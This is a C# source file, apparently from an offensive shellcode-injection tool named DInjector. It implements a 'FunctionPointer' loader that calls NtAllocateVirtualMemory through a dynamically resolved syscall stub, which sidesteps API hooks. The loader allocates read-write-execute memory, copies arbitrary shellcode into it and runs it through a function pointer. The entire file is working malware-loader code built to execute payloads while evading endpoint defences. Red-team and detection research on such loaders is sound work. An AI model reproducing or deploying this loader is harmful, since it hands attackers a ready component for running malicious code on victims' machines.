using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

using DI = DInvoke;

namespace DInjector
{
    class FunctionPointer
    {
        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate DI.Data.Native.NTSTATUS NtAllocateVirtualMemory(
            IntPtr ProcessHandle,
            ref IntPtr BaseAddress,
            IntPtr ZeroBits,
            ref IntPtr RegionSize,
            uint AllocationType,
            uint Protect);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate void pFunction();

        public static void Execute(byte[] shellcodeBytes)
        {
            var shellcode = shellcodeBytes;

            // -- NtAllocateVirtualMemory ----------------------------------------

            IntPtr stub = DI.DynamicInvoke.Generic.GetSyscallStub("NtAllocateVirtualMemory");
            NtAllocateVirtualMemory sysNtAllocateVirtualMemory = (NtAllocateVirtualMemory)Marshal.GetDelegateForFunctionPointer(stub, typeof(NtAllocateVirtualMemory));

            IntPtr baseAddress = IntPtr.Zero;
            IntPtr regionSize = (IntPtr)shellcode.Length;
            DI.Data.Native.NTSTATUS ntstatus;

            ntstatus = sysNtAllocateVirtualMemory(
                Process.GetCurrentProcess().Handle,
                ref baseAddress,
                IntPtr.Zero,
                ref regionSize,
                DI.Data.Win32.Kernel32.MEM_COMMIT | DI.Data.Win32.Kernel32.MEM_RESERVE,
                DI.Data.Win32.WinNT.PAGE_EXECUTE_READWRITE);

            if (ntstatus == 0)
            {
                Console.WriteLine("[+] NtAllocateVirtualMemory");
            }
            else
            {
                Console.WriteLine($"[-] NtAllocateVirtualMemory: {ntstatus}");
            }

            Marshal.Copy(shellcode, 0, baseAddress, shellcode.Length);
            pFunction f = (pFunction)Marshal.GetDelegateForFunctionPointer(baseAddress, typeof(pFunction));
            f();
        }
    }
}
